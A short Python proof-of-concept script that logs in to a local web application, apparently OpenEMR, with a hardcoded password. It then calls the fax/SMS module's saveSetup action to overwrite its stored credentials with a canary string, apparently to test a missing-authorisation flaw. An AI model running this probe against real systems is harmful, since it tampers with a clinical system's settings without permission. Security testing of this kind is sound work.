import sys
import requests

target = "http://localhost:8080"
site = "default"

user = sys.argv[1] if len(sys.argv) > 1 else "NIU"
password = sys.argv[2] if len(sys.argv) > 2 else "Niu123@rezwan"

s = requests.Session()
s.get(f"{target}/interface/login/login.php", params={"site": site})
s.post(f"{target}/interface/main/main_screen.php",
       params={"auth": "login", "site": site},
       data={
           "new_login_session_management": "1",
           "authProvider": "Default",
           "authUser": user,
           "clearPass": password,
           "languageChoice": "1",
       })

CANARY = "CLAUDE_TEST_CANARY_0905"

r = s.get(f"{target}/interface/modules/custom_modules/oe-module-faxsms/index.php",
          params={
              "site": site,
              "type": "fax",
              "_ACTION_COMMAND": "saveSetup",
              "username": CANARY,
              "password": CANARY,
              "key": CANARY,
              "secret": CANARY,
          })

print(f"[{user} -> saveSetup()]")
print(f"STATUS: {r.status_code}  LEN: {len(r.text)}")
print(r.text)
